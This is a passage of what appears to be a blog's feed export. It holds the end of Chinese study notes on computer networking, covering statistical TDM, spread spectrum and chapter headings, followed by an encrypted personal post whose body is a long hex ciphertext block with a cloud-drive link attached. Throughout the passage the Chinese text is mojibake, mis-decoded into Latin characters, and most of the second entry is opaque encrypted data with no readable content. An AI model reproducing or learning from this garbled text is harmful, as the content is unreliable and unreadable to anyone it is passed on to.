é¢å¤–çš„è™šä½ä½œä¸ºè„‰å†²å¡«å……</li></ul><h5 id="ç»Ÿè®¡æ—¶åˆ†å¤ç”¨ï¼ˆstatistical-TDMï¼‰"><a href="#ç»Ÿè®¡æ—¶åˆ†å¤ç”¨ï¼ˆstatistical-TDMï¼‰" class="headerlink" title="ç»Ÿè®¡æ—¶åˆ†å¤ç”¨ï¼ˆstatistical TDMï¼‰"></a>ç»Ÿè®¡æ—¶åˆ†å¤ç”¨ï¼ˆstatistical TDMï¼‰</h5><p><img src="https://i.loli.net/2021/10/11/krDoZJAMEmi6O5d.png" alt="image.png"></p><p>åŠ¨æ€åœ°è¿›è¡Œæ—¶éš™çš„åˆ†é…ä»¥é¿å…ç©ºæ—¶éš™çš„å‡ºç°ï¼Œæé«˜å¸¦å®½çš„æ•ˆç‡ï¼Œä¸åŒæ­¥ TDM ä¸åŒçš„æ˜¯å…¶ä¸éœ€è¦åŒæ­¥ä½</p><h3 id="6-2-æ‰©é¢‘ï¼ˆspread-spectrumï¼ŒSSï¼‰"><a href="#6-2-æ‰©é¢‘ï¼ˆspread-spectrumï¼ŒSSï¼‰" class="headerlink" title="6.2 æ‰©é¢‘ï¼ˆspread spectrumï¼ŒSSï¼‰"></a>6.2 æ‰©é¢‘ï¼ˆspread spectrumï¼ŒSSï¼‰</h3><p><img src="https://i.loli.net/2021/10/11/4wudMCfeF862aqg.png" alt="image.png"></p><p>å°†ä¼ è¾“ä¿¡å·çš„é¢‘è°±ï¼ˆspectrumï¼‰æ‰“æ•£åˆ°è¾ƒå…¶åŸå§‹å¸¦å®½æ›´å®½çš„ä¸€ç§é€šä¿¡æŠ€æœ¯ï¼Œå¸¸ç”¨äºæ— çº¿é€šä¿¡é¢†åŸŸï¼ˆLAN ä¸ WANï¼‰</p><ul><li>å¯¹æ¯ä¸ªç«™ç‚¹æ‰€éœ€åˆ†é…å¸¦å®½æ¯”åŸæ‰€éœ€å¸¦å®½å¤§</li><li>å¸¦å®½çš„æ‰©å¤§è¿‡ç¨‹ä¸º<strong>ä¸åŸä¿¡å·æ— å…³çš„è¿‡ç¨‹</strong>ï¼Œå³åœ¨ä¿¡å·ç”±æºç«¯ç”Ÿæˆåæ‰è¿›è¡Œæ‰©é¢‘</li></ul><h2 id="Chapter-7-ä¼ è¾“ä»‹è´¨"><a href="#Chapter-7-ä¼ è¾“ä»‹è´¨" class="headerlink" title="Chapter 7 - ä¼ è¾“ä»‹è´¨"></a>Chapter 7 - ä¼ è¾“ä»‹è´¨</h2><h2 id="Chapter-8-äº¤æ¢"><a href="#Chapter-8-äº¤æ¢" class="headerlink" title="Chapter 8 - äº¤æ¢"></a>Chapter 8 - äº¤æ¢</h2><h2 id="Chapter-9-ä½¿ç”¨ç”µè¯ç½‘ä¸æœ‰çº¿ç”µè§†ç½‘è¿›è¡Œæ•°æ®ä¼ è¾“"><a href="#Chapter-9-ä½¿ç”¨ç”µè¯ç½‘ä¸æœ‰çº¿ç”µè§†ç½‘è¿›è¡Œæ•°æ®ä¼ è¾“" class="headerlink" title="Chapter 9 - ä½¿ç”¨ç”µè¯ç½‘ä¸æœ‰çº¿ç”µè§†ç½‘è¿›è¡Œæ•°æ®ä¼ è¾“"></a>Chapter 9 - ä½¿ç”¨ç”µè¯ç½‘ä¸æœ‰çº¿ç”µè§†ç½‘è¿›è¡Œæ•°æ®ä¼ è¾“</h2><h1 id="0x03-æ•°æ®é“¾è·¯å±‚"><a href="#0x03-æ•°æ®é“¾è·¯å±‚" class="headerlink" title="0x03.æ•°æ®é“¾è·¯å±‚"></a>0x03.æ•°æ®é“¾è·¯å±‚</h1><h2 id="Chapter-10-æ£€é”™ä¸çº é”™"><a href="#Chapter-10-æ£€é”™ä¸çº é”™" class="headerlink" title="Chapter 10 - æ£€é”™ä¸çº é”™"></a>Chapter 10 - æ£€é”™ä¸çº é”™</h2><h2 id="Chapter-11-æ•°æ®é“¾è·¯æ§åˆ¶"><a href="#Chapter-11-æ•°æ®é“¾è·¯æ§åˆ¶" class="headerlink" title="Chapter 11 - æ•°æ®é“¾è·¯æ§åˆ¶"></a>Chapter 11 - æ•°æ®é“¾è·¯æ§åˆ¶</h2><h2 id="Chapter-12-å¤šè·¯è®¿é—®"><a href="#Chapter-12-å¤šè·¯è®¿é—®" class="headerlink" title="Chapter 12 - å¤šè·¯è®¿é—®"></a>Chapter 12 - å¤šè·¯è®¿é—®</h2><h2 id="Chapter-13-æœ‰çº¿å±€åŸŸç½‘ï¼šä»¥å¤ªç½‘"><a href="#Chapter-13-æœ‰çº¿å±€åŸŸç½‘ï¼šä»¥å¤ªç½‘" class="headerlink" title="Chapter 13 - æœ‰çº¿å±€åŸŸç½‘ï¼šä»¥å¤ªç½‘"></a>Chapter 13 - æœ‰çº¿å±€åŸŸç½‘ï¼šä»¥å¤ªç½‘</h2><h2 id="Chapter-14-æ— çº¿å±€åŸŸç½‘"><a href="#Chapter-14-æ— çº¿å±€åŸŸç½‘" class="headerlink" title="Chapter 14 - æ— çº¿å±€åŸŸç½‘"></a>Chapter 14 - æ— çº¿å±€åŸŸç½‘</h2><h2 id="Chapter-15-è¿æ¥å±€åŸŸç½‘ã€ä¸»å¹²ç½‘å’Œè™šæ‹Ÿå±€åŸŸç½‘"><a href="#Chapter-15-è¿æ¥å±€åŸŸç½‘ã€ä¸»å¹²ç½‘å’Œè™šæ‹Ÿå±€åŸŸç½‘" class="headerlink" title="Chapter 15 -è¿æ¥å±€åŸŸç½‘ã€ä¸»å¹²ç½‘å’Œè™šæ‹Ÿå±€åŸŸç½‘"></a>Chapter 15 -è¿æ¥å±€åŸŸç½‘ã€ä¸»å¹²ç½‘å’Œè™šæ‹Ÿå±€åŸŸç½‘</h2><h2 id="Chapter-16-æ— çº¿WANï¼šç§»åŠ¨ç”µè¯å’Œå«æ˜Ÿç½‘ç»œ"><a href="#Chapter-16-æ— çº¿WANï¼šç§»åŠ¨ç”µè¯å’Œå«æ˜Ÿç½‘ç»œ" class="headerlink" title="Chapter 16 - æ— çº¿WANï¼šç§»åŠ¨ç”µè¯å’Œå«æ˜Ÿç½‘ç»œ"></a>Chapter 16 - æ— çº¿WANï¼šç§»åŠ¨ç”µè¯å’Œå«æ˜Ÿç½‘ç»œ</h2><h2 id="Chapter-17-å¹¿åŸŸç½‘SONET-x2F-SDH"><a href="#Chapter-17-å¹¿åŸŸç½‘SONET-x2F-SDH" class="headerlink" title="Chapter 17 - å¹¿åŸŸç½‘SONET&#x2F;SDH"></a>Chapter 17 - å¹¿åŸŸç½‘SONET&#x2F;SDH</h2><h2 id="Chapter-18-è™šç”µè·¯ç½‘ç»œï¼šå¸§ä¸­ç»§å’ŒATM"><a href="#Chapter-18-è™šç”µè·¯ç½‘ç»œï¼šå¸§ä¸­ç»§å’ŒATM" class="headerlink" title="Chapter 18 - è™šç”µè·¯ç½‘ç»œï¼šå¸§ä¸­ç»§å’ŒATM"></a>Chapter 18 - è™šç”µè·¯ç½‘ç»œï¼šå¸§ä¸­ç»§å’ŒATM</h2><h1 id="0x04-ç½‘ç»œå±‚"><a href="#0x04-ç½‘ç»œå±‚" class="headerlink" title="0x04.ç½‘ç»œå±‚"></a>0x04.ç½‘ç»œå±‚</h1><h2 id="Chapter-19-é€»è¾‘å¯»å€"><a href="#Chapter-19-é€»è¾‘å¯»å€" class="headerlink" title="Chapter 19 - é€»è¾‘å¯»å€"></a>Chapter 19 - é€»è¾‘å¯»å€</h2><h2 id="Chapter-20-IPåè®®"><a href="#Chapter-20-IPåè®®" class="headerlink" title="Chapter 20 - IPåè®®"></a>Chapter 20 - IPåè®®</h2><h2 id="Chapter-21-åœ°å€æ˜ å°„ã€å·®é”™æŠ¥å‘Šå’Œå¤šæ’­"><a href="#Chapter-21-åœ°å€æ˜ å°„ã€å·®é”™æŠ¥å‘Šå’Œå¤šæ’­" class="headerlink" title="Chapter 21 - åœ°å€æ˜ å°„ã€å·®é”™æŠ¥å‘Šå’Œå¤šæ’­"></a>Chapter 21 - åœ°å€æ˜ å°„ã€å·®é”™æŠ¥å‘Šå’Œå¤šæ’­</h2><h2 id="Chapter-22-ä¼ é€’ã€è½¬å‘å’Œè·¯ç”±é€‰æ‹©"><a href="#Chapter-22-ä¼ é€’ã€è½¬å‘å’Œè·¯ç”±é€‰æ‹©" class="headerlink" title="Chapter 22 - ä¼ é€’ã€è½¬å‘å’Œè·¯ç”±é€‰æ‹©"></a>Chapter 22 - ä¼ é€’ã€è½¬å‘å’Œè·¯ç”±é€‰æ‹©</h2><h1 id="0x05-ä¼ è¾“å±‚"><a href="#0x05-ä¼ è¾“å±‚" class="headerlink" title="0x05.ä¼ è¾“å±‚"></a>0x05.ä¼ è¾“å±‚</h1><h2 id="Chapter-23-UDPã€TCPå’ŒSCTP"><a href="#Chapter-23-UDPã€TCPå’ŒSCTP" class="headerlink" title="Chapter 23 - UDPã€TCPå’ŒSCTP"></a>Chapter 23 - UDPã€TCPå’ŒSCTP</h2><h2 id="Chapter-24-æ‹¥å¡æ§åˆ¶å’ŒæœåŠ¡è´¨é‡"><a href="#Chapter-24-æ‹¥å¡æ§åˆ¶å’ŒæœåŠ¡è´¨é‡" class="headerlink" title="Chapter 24 - æ‹¥å¡æ§åˆ¶å’ŒæœåŠ¡è´¨é‡"></a>Chapter 24 - æ‹¥å¡æ§åˆ¶å’ŒæœåŠ¡è´¨é‡</h2><h1 id="0x06-åº”ç”¨å±‚"><a href="#0x06-åº”ç”¨å±‚" class="headerlink" title="0x06.åº”ç”¨å±‚"></a>0x06.åº”ç”¨å±‚</h1><p>è¿™ä¸€éƒ¨åˆ†å¥½åƒéƒ½æ˜¯ç§‘æ™®æ€§è´¨ï¼Œè€ƒè¯•åº”è¯¥ä¹Ÿä¸è€ƒï¼Œå¯èƒ½è¦æ‘¸</p><h2 id="Chapter-25-åŸŸåç³»ç»Ÿ"><a href="#Chapter-25-åŸŸåç³»ç»Ÿ" class="headerlink" title="Chapter 25 - åŸŸåç³»ç»Ÿ"></a>Chapter 25 - åŸŸåç³»ç»Ÿ</h2><h2 id="Chapter-26-è¿œç¨‹ç™»é™†ã€ç”µå­é‚®ä»¶ä¸æ–‡ä»¶ä¼ è¾“"><a href="#Chapter-26-è¿œç¨‹ç™»é™†ã€ç”µå­é‚®ä»¶ä¸æ–‡ä»¶ä¼ è¾“" class="headerlink" title="Chapter 26 - è¿œç¨‹ç™»é™†ã€ç”µå­é‚®ä»¶ä¸æ–‡ä»¶ä¼ è¾“"></a>Chapter 26 - è¿œç¨‹ç™»é™†ã€ç”µå­é‚®ä»¶ä¸æ–‡ä»¶ä¼ è¾“</h2><h2 id="Chapter-27-ä¸‡ç»´ç½‘ä¸è¶…æ–‡æœ¬ä¼ è¾“åè®®"><a href="#Chapter-27-ä¸‡ç»´ç½‘ä¸è¶…æ–‡æœ¬ä¼ è¾“åè®®" class="headerlink" title="Chapter 27 - ä¸‡ç»´ç½‘ä¸è¶…æ–‡æœ¬ä¼ è¾“åè®®"></a>Chapter 27 - ä¸‡ç»´ç½‘ä¸è¶…æ–‡æœ¬ä¼ è¾“åè®®</h2><h2 id="Chapter-28-ç½‘ç»œç®¡ç†"><a href="#Chapter-28-ç½‘ç»œç®¡ç†" class="headerlink" title="Chapter 28 - ç½‘ç»œç®¡ç†"></a>Chapter 28 - ç½‘ç»œç®¡ç†</h2><h2 id="Chapter-29-å¤šåª’ä½“"><a href="#Chapter-29-å¤šåª’ä½“" class="headerlink" title="Chapter 29 - å¤šåª’ä½“"></a>Chapter 29 - å¤šåª’ä½“</h2><h1 id="0x07-ç½‘ç»œå®‰å…¨"><a href="#0x07-ç½‘ç»œå®‰å…¨" class="headerlink" title="0x07.ç½‘ç»œå®‰å…¨"></a>0x07.ç½‘ç»œå®‰å…¨</h1><p>è¿™ä¸€éƒ¨åˆ†å¥½åƒéƒ½æ˜¯ç§‘æ™®æ€§è´¨ï¼Œè€ƒè¯•åº”è¯¥ä¹Ÿä¸è€ƒï¼Œæ‘¸äº†</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘çˆ±è®¡ç½‘è®¡ç½‘çˆ±æˆ‘&lt;/p&gt;</summary>
    
    
    
    <category term="NETWORK" scheme="http://blog.arttnba3.cn/categories/NETWORK/"/>
    
    
    <category term="è®¡ç®—æœºç½‘ç»œ" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>ã€PIECES.0x01ã€‘Shellä¹‹å¤–çš„å¾€äº‹ï¼šå¤å¤©çš„é£</title>
    <link href="http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/"/>
    <id>http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/</id>
    <published>2021-09-06T21:24:59.000Z</published>
    <updated>2022-06-26T05:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="3e5776f56210393896028edc3afb6f14b7284fbff871de4800b7136399970d0b">eef143a3a3e51e2ee0b1e9c84de8c53c5af9a8774c5ccd7761c7ce1da7021303af3a5f4afe1182ef44b9570739980a2a177218976c11dc3e94ea28b1308ea85f4bc67c79fca9c560933e43208f8300d905efc0b3c96eae5c2e2af117daad2b2c6caa290fc707787fd3197b4b872654aaa8d62f0ec0ee1aed8ed9cb702191a2f643d659bd2b6e4ce9402f0083fb2edee066b597a437c3baf23ee3b85553393839dee2c020ba0f1ff602a06dc926031b0ae94c8bde3b4fbfff6a22b7f43bc599113cb8e71096273c7c89e72d23d5c8fd278e77945cb90c4472372d27cab14b08691a5ebdbbc5077f3101aa47945ac4d2725b81243c81fb52acf80c6ec5615ad98b146251a879f3d2d2586e3bf740f799fa5b149ecf45161bd532e5de2a86a768ac4aebc7735175aa59511c3ad34f4d8d7dc1127cb4351d9b710ed6be83023c179c3d5c425cdc91f2bb27f6082e8954b258596face167f92a7cf17b19c833cfb6eede2eb2fea6a2fdb01df20111216ad7706c1c1cc0bb87cfc8eb20f662fd6365d48fcd3b32f9b14ed86d4b2f21fd99461deb181c762d2e40358d632f818d7318ff4d9c8b2a5d7a6dde224fe907f580504d8197d50a1609f3abe055bae8c2edbda7c44bc8de9b15647c1f6e5b1be4b4ea69f67b2fcd13372f881f6e1a26450a9514000d96f196a4f40b0cdd528b3d0fa27ab88151a936f7cf848b9a0bcd676d838763a3697b83ed13c575fd718e85d2daa8d1aef1c34317ddad580d1a153a9e8c1a82cc84b475854344b8d2c12eae14bf98bac965ff08ee5915f9f05b664a2dbb4030fca9957798d665a7b7bdcc47deda64c553e036edec1eeec9c6f45736bc846957e5fee0a66ebc19259d2fb679f1aaaf51758ba8f677279daf8c00a57a829539ffa412aeccad4f13823e843ab0ed82c4cf389ad1a2423c14b95788522ce80ec643b3fa54938e9cbad34e4d0efc98a2efdfe38a16dddebef1862508ef13692594bbc8bc74bbef48beda5db50b217b61e555b58a8ce1107e12129ed816df4e204c653bcbbe4164a9a865d2e9e821c26cfbfec88c4692d20beea4ae022d4c5a469e05bf927e8d25f9ecd7386d69cc803deaf6397ed79558c381a9887d1ebcb0bd276195650f7afedbf45094b2406277fc074567bc418440a571080cec35b69f23c87625cadb0250d90cf08d329f71fa48fc5e7a4f877a642eee4e659235ecc10f9987764c2325fbe8249a435ceb00a5ce25ea601ecc9f320f419474aa2bcdc30a5358c64641783cda701ca08f5e3f75df3e4678aff581feae2ee722a2a92c176bfdb3fc826c1a25956f8382bcd9a02c52453aefa93c0ca4ae304b4f9172fed07f938417206e3ca118fe68dd377525b4565b5f106f6939f224964e44d1f0a538b18116f13157007bb05db1d9aee1c8a45a3427fefd03eba4f75c0ed16e5c447bc455a776b40811e59ad6e9fafea176ad08870102198f8b21f2f48d36f88efdcac391c4b19df2fd74c06f7cd91cd7bcbe0e5786e340a79e3bd985db4acaae999bc6190379111931a0428b21a6f8eb2c84367d0cf4d2ff7880c9acfdd9289ff4985b96e12c55b299af31a0abc024cc4403c7ee706772176384dc7768c7df6bd5540bd5d11745359c19670023e11e2d28d6fe48f7a2a38df475bd8b38a07c25f65a2dd534ab7e512000e1b8ab3fd6c076bfd020ea093abe05d35d7224cc188d4028e151df8435db8e0c204c5196b0af73e7c163ac468429fadaca02d2bd9d9f50ce491a92d356ff8c794fbdddae1b939dd61a609f390cb95e59ae0cc129b6d11284ce4a8d6e1bd06f99cd4a6bb076755282bfb26d31667b867d5d74605d298f8813fe5bd997a95f34d975844dd0a77c72f46b35725ca6115dca702e014f2fc1c1838f417dae802e2369bdc6b4c860fe7b4e670da0724ad985f5da748421151b7e55f3828298eb30a46dce2a10ffc2cd744361d678d1bcc5ab07b5844931e20c5f28590ec28e9c44b8aa58219b62d041ab54e402072377c28eb880c3e76caff37c5e77d3e7be0b4e0c51493ab28477ebab6e68f24a372e76fe65ec8e87a3f9f823f2227eb5caae487d4e4b6e928ccee144e5b3b4eaab54665f51a2418ef9731983382d9e9f2cda9544ffa8e97cfee324bd3b1a4d12a39d9ca515b7d6704898ed768ac6cefd6c021caf7581db38ea8c9b16d5d8b159db59a78d6574c4b48f5daf7424e9b211c189110b20e79a1a5ac768de7fb8c4732fe81b45c71ec9b0a098cbd66e60549810385d71bd291bb4f0881d7a00b1ef8d350d5346d38f05eb4c3a4470e975cba9065b62a8c2102c731d149507946d39e8df6d817559159afc2a707f4586c63430f9ee65f215db8fdda0f8522922498e6a329eb8c0a4150510a38de7f8f0624752c84c3ba18bf6796fd4759ca22452d8b8d88ffa4854788b18580081600568777868786ffbdfc261da7c3edd340b0598151d295e244dfb31fb0ed5a67c30ce9494dd67379c614dddadb2cd94e9ab99ba841485df401693702abe90cd9fef29cef76739dfbd03c8e7e81756e0e05966a5956627a37f9aa858ea521bd17900c6de469a2339140913db907b9ad70d704a32bd79561230e193905e0fa9a4a4308ef09751be8079b933420dffb5965ccdd02b04d58ac59c22723d94deb0fd5635b06261afe5ade88a234064a2dda976188776378003e105d93c60de71f777f6165678e762a2fca67b71d32839fa52404f114509ed34e37896292dc9be5bff52ed455c8965d3996512c613dfa738953ac18a0ee11838ad9e18749ae687c426b3b7d2e4eac8fcd5a9a6c16b1fe5ef0d912a6c101ecd9c98113b578e60a8bd6a32524bda395ebb1e2a4557f4ea104d018a0a4d7e43a0008dafc4ed7e40c319f0a27314a3419177a507cee95684ba339b406e157270af816a7733ff904c8fae9d6d78ab51a1df17d26a24bd65badf7f735e6006e11022b7f73ac1297effd9ba8028153059e9ddc97c2e1511878bbd5ea2e69ea24d287840c1d9c0005a0a2e9bf197e9b2b6fb65880000b6c593371d63e0bc5c353442be5403a879f79cd0e0423577864b266eecd9b580b92409e7c8c9d59d7df43742eabd359e11ca687ff9cab3c94093d55de970a4046f6e3192e92b53cf2aa9f777605a5103ca1b2528b782ea52180275c216081bd1b463accd0dde7dc30c5d3c118ddb051f5483564f6afb76ae891164106686cc7e6886bc6aaa4b88454ba970d41c3a1335f3cfd8e4853a4c6c70c844cb1e2ddf83a245f3c5474b539b24a76a473376919fbbd914d8bf6216fa59e9c7872c3460d5b2109d874ebba92a51e6ff495c7cdbcd71ee130b44885fa4fce47bd40be7b453f1ab8e75f82293120cf97da5263c7690142c46a9de8707129a4b04f5bc8680fb0be9d95fcf397ad8c361b1bb457da0aae8fd99039dd8532c972af1ca2eecae236ea18e6be6275bbcb1f70e70908483b6c0cd093a2ba0f4b59752a0f5f1645762bd969d529ee875b5d5dbd572a21c2d1f7db649ba670b23a8e735ba87e29fd3356de63611bbbbe91cae3105e9d0818022d62017c1cd9aef3b144da3b8b3490c963d4a9a2658fdabbefeb660569c30fc1dfc4d5baedd8fc07024d4490ca23846348a6cc35e2c2101385ebef465c2d2b6ce88a77f0bdf8e2310dd9d721bf8c3e09bacaf5f62e300174af45a803dfc861e458681a77e5fdae5942ee6b0521218c37a4ba9bc63baf599b4a39cf5c46f0bf61b8cd076693c2d4a1e51e9276fda6a60bf69be6302ae6c69d9deea69cb56a335156ef30c72f8b6288d9e1cc19d67235d04dc930735f80cc9cf12b904a9f557903e3d0eeb65124c374e39a7fc5156bbc2ae59d937d82725be189d3dc49944334c50f2328ea4aee2cdd6ae9358d370c3b7bdeffd43b23aa94716adf854b2223891abb5ea652ed5935dfbdf2361d6c039fe8f8c901bd5dd3c22f1f70a378e8ffbcc6fbec7b6359d75050347a52711e6036e3d2ea3ee3bb6d381dbaf18dc7ceb2e9bd09e70e7ef28e090985b5a9a8c6fddaeeff514e7dada93445a27d94306043aab3acc77cf5b59efcc27e10b97d85f9d9aea810fd067b46e311da224175803662fb03ee5c74c85fc83737f33317c290313b304cfabf218f23aa153b4ec8e47988ac9491bf27e4eaf6b30769575b4968a6da9c9c40674a4f21ef5f2f72e74b5a947d0cd9a419e984275af7b18a93f439b2fa15b80e171ec7e6dd3c36fc51863e713428e2b42567a4c6dcc73b9c416e059c949158cd8770a1584e164332acfa07e809b2995476efccc3a2dd992e29c75583cb1f16220ee0e644bd8ede90b9c634e347d0ec945bcaee282816cac9853489c31c20e1036b9e3c051780298093f2926fe433eb2181479a6e43cbeb5dd66cb3e43b0875c5140a0c7d8be165eb03762ff57bb2d945278c38a1d4273c4f9c57f9765a2e6103132c38aac2fe247593b48870f1a34912977b31004b06412e34545432b55dfa3ded3b73b568c0d5d334abc04c43fde4c99590ad86ff5a3897eb38d6f7099ac3a996fd39770545352bcbc6a5a8eca0ff66c27efcafff03000dae92074f71a23cbd345a67ff71427b1a5abf1c1c5aa8efb9961937fda7bd22797d9714074aded27c5f93dc925d55beb8c0a5a0f35c854100183adcecf4a5929e15b76684b0a582ccb90d368ffe4dd03a3878cf657ca6367ae10b1d46121f5f95ee38a3ec13e24f39d6e3680cda02edcec19aeb3c42fa3281d186a60b2e24ac103f0f18b7abccda3287906e1469e1b1e525dd5b214450918303a714bbb999b59690060a8490346cf3ed7fd318be9d672cc871b47b29121abea0f02cf2790c84288b90e3dea5bc60640b80a605958d6c99d5d92d2dfaab61fb96311ef67ba338b7a06ca03bd9d1eb1ff185df072fa721206571b36b062658fd1e0613506667458594058a8d2815b7e1a03386ea0ab08baa68e23a9d25c736712b9eccfde901139bbf78eb9860d9c9f45d72904ffce21295f941bbf88f62839304a1d6b06a9d8608b6e50b69997eba96f6dc50b53e2cff6c0fbe45a4f5425c0bcb91c612542c82e98290d4b231dcc1651dd1d180c172be83d5642642bd98e626b2d96bb54f78b29797e267e33f4c51156bb55f0904ac20d6b2a807ea90a50fc8e2d866198a6d57804078987b07df45c02bc3f196dcd67934b701874295578e14c70fea64dc13247622d961393f46de3ea43fcdce5412f7fbb17ebf961fe4af831f6fbf19a9cedd11503b72d83d1f54c1b4d981b94392876a6ccb7f473f292cbd4018edae426fc6fea0c2900e867804cd7b4a95e5d36c12c8a5c73c4f7cf687c0facfadd9cb64720bb3d07afaa9a24900138a177813f26af03307b1675044c3c894194286b5b978e8da289c76b0502774354f7d474bc9bc618b326ac396eb59303750a46c9b0fd5f8fa9aaef570cd3b6e9d15a96eaee38ec36f90399461d234b58a9453d853ed72b42e8e1591bae5c864cbed08042472db034dae99bc2a36fed3db63a3c399373d7fb8fd35003f1cb4287b27832bb9ce2e4c757715c15fb87f5250feb8db9817592fa94239b1b78940d52d531fa9e56afa67b30ec26dd53ad2405d463f2ff7c4fbef25840e7693910e13b5d3dde3ca46c4dde271d451792429f2d4ab302c8bfe39c0d7b178abede498c4469b7ce6d1260355553af4c52593173f977ab463cd688975a98d5fbecb0e5d8330e8e4ad3d887d425dcb03ce7bbd8d5edb1401ec9d0504adb5844f465808cf4d91bc1c1575cb2821faa64af61472ad309ce5a036c137f31a267f5b9196fc9510b8261b269b73a26397046e8b389b7fe0e2686f8dc908fea406c60e405539d91fda24e785bd72a81b7b32959266ff6d51280930a7a289b686ec4e2364d99264531288605ca1d8310ed7938aec353e4e4534d7d7c9aa2af21bd94b50c4738f6f17f64f48c2effd842f717722efec19dc57f14a583d2cfe5d1caec04243dcf0f879be0cd3e9e43aec42e7bdf3e69e9b5f55b250e66c7fa62094d3d9a585ec46320ea726c4e28ea63217557fdcf607623270bd83711d8c3542d98a2c7abff51d1906bac38eddbd7dea9ebaf27daaaa72dfbd188ce76a666f180634822906c7ac89476a210d09cedc19e261f9a9c885c9ea8a6a78a92a4b4a985ad2a587e60f64c02196c585041e6b7ec476274840a0cf1eddad22aa35d5d6acd75b64919c6c261db1b9c1b633c3e9cb0b40de6bc187597e0dcca1856850547491b16a10b116bdca8faacb6f5562690771854dba11620d0fce7b7eff962074b959b82d55dca5160f4c5f7b25bb01e2cc37dc158026aff44843aa4f6dfc7842eccdedf7e372eb2f51337f6dde0676107f51ed3f9f71194f72a03115da04a90c423efeff7388202caa6e42c33a1d8112c8fd953e6f9d737c2ef0547f81732f3805e487123d5f383debb679533931c5cc255b0691c383e69f5dd07f7d58fc0fe6676963b2ce0b58f80333d1fbb904fe4829b6f40248147eb25d6d492c3f12524f519916945cfb380e9d27df765357d2f917741e9c98ad648b34d4dc325e921eb993b3e6fc5eb8203cddd727ae89a465deea2eb798bbd3733074addde10051ec3a01267932f98e0e7248e2e8726fa95522ef11826fcf5de77b22e3f223911b625e46d50e939df0bd80803361fbdc5b5571b9a6fa80969bb636e27b1a813e7a67f073ea491d3d82a6aa0fac6024cced4432fc327a633e6b0e086d972a6f47e4c46d02a148fb081f1c324515e766111a4082da9d426f2d591cab46c498106e1f304ece528b1931fa7b36d5895b5627f8355ca1a71017d07cd76cd2fea0d110251ef3a42203b97bc796de509376dc08aeaeacab80a2549a5eb0e6f8a571a860b7b0811b72e69ae749564cec2e877dfacd53d018037c440bd5510b9e81c03b28ba50bf3e94021e8c1f6bf6f1a132ac4ec1e8dffc6e811ed7b6be14d68850a8b135ebf1293d6492d8684b05c5ef6602dc76057ba9cefb0504e27f5cf467b6fcb67eac4365dd0d2b485b17f6820caaa853f110c5a2fc3636b6570c95bbfd7d642a1f0f04ab0babf36b2c1e3eb4f2824f44983853814b7570baca8f4dfa260c144f3c58941eded09e7c161ed424e185e96b937efc031c865eb751f6d739410f89723d7a21cb4e1db01eab7fff7332330e2aef921df8ad64aad5ff172117d9abf3e619b5b47abe60d7d83ac9cc0e90138b0d409ec70f058ccafed59ece32e7294bdc92fb9fa1c384d8ea261b6e6fe9228c9e5dcc10fc2cb026cefaee446f2949111dfac619b2222d0059a91d16161b07391175337424fea50b98194d424f2cd58bbb4c6e1d76cb1acf6640cb312fbe6c682a8efc8aeed71a16f9c0a960633f92634e49a5a57f19db105c7da7533c81be1b14f43e09af6a600734cfadbbb4c9522c30bc30d7f0364db0b907f86360cf1a8dd6ce827f012f466c3e4cb122d4f93fd49570e44caad4d8e6033d7075c399dfc47223f35e16d881c96f8f911cbd8d46a8b1d8752a1f8cfd04cf3ce293cdd0a5ed57ec58dc361f64f1fff597b535e86f438b3813c4b320e803a2dde3defdfd9301364c798f58ee5ad2cc067e1f59d5cd0f3896c7a1ea80094e40ea46a10814e5d8371e741fbb0227d02a1830d8440692402f3a4c6b0cca2c7087fcddeb1a0d6b3992597fe976a992f7a9e1037dd6288f821c8f99f2b287fc63df07a1b2bc7ff85035d85876bb182eec07da4d3d5ddaa2590167b929c5cdb9c63298b7b89ef25b01c8579991ceb0935b59abc6a70fd5cc58beab277217524f3a909300d3f85c11f43e42ef9782e88f5021b2823f1dc294949de708a595cd9f9c0575ab33d150fc0ee81d4baf7d1554f4ebfb9eea4f5bce166a0088f3dc71d1c7133d09b3804615558aaedc938c18ac605f09e329ef5774352444bd7e8f5f7b21cfc9ac365fea13c0b8a86d1fbd3f49b2fbe70056543ee6677456e47467d09d579a52cf564a92693636418c0e8054189ff3a7da93cda2a3b222072a830ddfa0d89533c516318e646ea3c601ee45c21a8760bffee51aaa1649c2e764170ea50eba7e4a83a731b9c6d876dea6c2db5bc98c0cd04f3ff6dcf7f39c0629be2d57e2643970621ac7a6711487a6546c15eed313f4579d0a05855718b00f4fe9071adf18b2b03e3d2f6ce35ccc81a581f74a91bb8b224c5221836a2dd059696a2a99bf3cde500ba26f63eecfff21f0a5c47bae9b4d43fb54fb1b0501a016826547447c3c3ac572d9c674a4930e6cedaced2a34d8198eca0a6a1abb3f4517065a31306694eb9d561aea8956ef6560c828b3ba491ab3c15849a19d64c979dd6f5f79b6c56c07d5114bfa6a9f25301eeb8f0ed044c4687d48f780b4d89e4b15072d26f9f33519dedd3357e77dd5f6ecdcdcc66b0e877083976ed589d7fb1cf596b0a217bfcb35d8750c179a6d7abd0a17a9379485f75e3fb39c9236cbde80b54c166cfca925887d55db2e2ab176d1d81d87a1fe46d97eb38e4e5109ec7ccd24cb19ae1ef068482a8199288b1c04941d60f6df56c5c162e52b0f3d7ebc0012db4778fad7f447b1ac8d818a8ff7c0bf443d089ec5b961eaee0147cb4ee0fd275efda794076d982ddf6eccc8f6b37b80e93e7756e714022fc026a6fcf96fff0a0dbd4dc460e680f81b187c2d5c439d9d34b62b1088d54706065bb0e1fc5af5a6de4c75aea52951fd01e9d4b351d5fc28ec7a8a8bbf7191299b2fa949425957650a4e371c734bedb7c009bd969aef5f5637b4d5fc8c2bc354b16e7d13f19e234d96270527952eb8cf0e2998b40e9a6b0a828aad840e77316a1159be58808b515df3c7a7d297040d6422a0b9b5ba18954a9663f1bf417deb6c1d879901845